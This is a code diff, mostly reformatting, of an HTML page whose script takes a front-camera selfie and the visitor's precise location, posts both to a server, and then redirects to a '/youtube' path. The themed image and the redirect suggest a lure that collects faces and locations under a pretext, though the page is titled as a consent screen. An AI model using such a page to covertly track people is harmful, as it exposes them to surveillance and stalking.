@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Live Location & Selfie Capture Consent</title>
+    <title>Consent: Location & Selfie</title>
     <style>
-        body { font-family: Arial,sans-serif; text-align:center; margin-top:40px; background:#f8f8f8; }
-        .tmkoc-img { max-width:400px; width:100%; margin-bottom:20px; }
+        body { font-family:Arial,sans-serif; text-align:center; margin-top:40px; background:#f8f8f8; }
+        .tmkoc-img { max-width:400px; margin-bottom:20px; }
         h1 { color:#333; text-decoration:underline; }
-        button { padding:15px 40px; font-size:18px; background:#ff0000; color:white; border:none; border-radius:5px; cursor:pointer; }
-        #status { margin-top:20px; color:green; font-weight:bold; }
+        button { padding:15px 40px; background:#f00; color:#fff; border:none; border-radius:5px; font-size:18px; cursor:pointer;}
+        #status { margin-top:20px; color:green; font-weight:bold;}
     </style>
 </head>
 <body>
@@ -22,12 +22,12 @@
     <script>
     async function startCapture() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }});
-            const video = document.createElement('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"} });
+            const video  = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
+            navigator.geolocation.getCurrentPosition(async pos=>{
                 const lat = pos.coords.latitude, lon = pos.coords.longitude;
                 const canvas = document.createElement('canvas');
                 canvas.width  = video.videoWidth  || 320;
@@ -42,14 +42,15 @@
                     body:JSON.stringify({latitude:lat,longitude:lon,selfie})
                 });
                 const {status} = await res.json();
-                if(status==='success') {
+                if(status==='success'){
                     window.location.href = '/youtube';
                 } else {
                     document.getElementById('status').innerText = status;
                 }
-            }, err => {
+            }, e=>{
                 document.getElementById('status').innerText = 'Location denied';
-            }, {enableHighAccuracy:true,timeout:10000});
+            },{enableHighAccuracy:true,timeout:10000});
+
         } catch(e) {
             document.getElementById('status').innerText = 'Camera error';
         }
